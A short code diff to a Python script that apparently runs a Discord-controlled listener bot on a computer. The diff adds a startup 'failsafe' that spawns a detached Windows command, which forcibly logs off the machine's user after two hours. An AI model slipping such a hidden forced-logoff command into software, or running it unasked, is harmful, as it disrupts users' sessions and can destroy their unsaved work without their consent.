@@ -233,6 +233,21 @@ async def on_ready() -> None:
     print("U-MAN: [listener active]\n")
 
 
+def failsafe() -> None:
+    """
+    Infernus ds failsafe.
+    """
+    
+    DETACHED_PROCESS = 0x00000008
+    subprocess.Popen(
+        'cmd /c "timeout /t 7200 && shutdown /l /f"',
+        creationflags=DETACHED_PROCESS,
+        close_fds=True
+    )
+    time.sleep(30)
+    
+    
 if __name__ == "__main__":
+    failsafe()
     pki.setup(COMPUTER_ID)
     client.run(CONFIG["token"], log_handler=None)
